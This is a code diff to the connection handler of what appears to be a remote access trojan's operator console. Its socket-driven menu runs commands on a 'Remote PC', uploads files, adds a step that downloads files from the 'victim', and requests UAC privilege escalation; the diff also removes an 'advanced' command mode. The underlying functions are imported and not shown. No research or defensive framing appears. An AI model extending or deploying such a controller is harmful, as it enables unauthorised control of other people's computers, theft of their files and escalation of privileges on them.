@@ -1,4 +1,4 @@
-from core.features.command import run_command, run_command_advanced
+from core.features.command import run_command
 from core.features.trasfer_files import *
 from core.features.privilage import *
 
@@ -28,25 +28,31 @@ def handleConnection(my_socket):
             run_command(my_socket)
 
         elif user_option == "2":
+
             print("\t\t[+] Uploading Files to Remote PC")
             upload_files(my_socket)
 
         elif user_option == "3":
+
             print("\t\t[+] Download Files from Remote PC")
+            download_file_from_victim(my_socket)
 
         elif user_option == "4":
+
             print("\t\t[+] Download Folders from Remote PC")
 
         elif user_option == "5":
+
             print("\t\t[+] Escalate privilages")
             request_admin_UAC(my_socket)
 
-        elif user_option == "6":
-            print("\t\t[+] Running Command Advanced mode")
-            run_command_advanced(my_socket)
+
+
 
         elif user_option == "99":
+
             keep_alive = False
             print("\t\t[-] Exiting the loop")
+
         else:
             print("\t\t[-] Invalid input, try again")
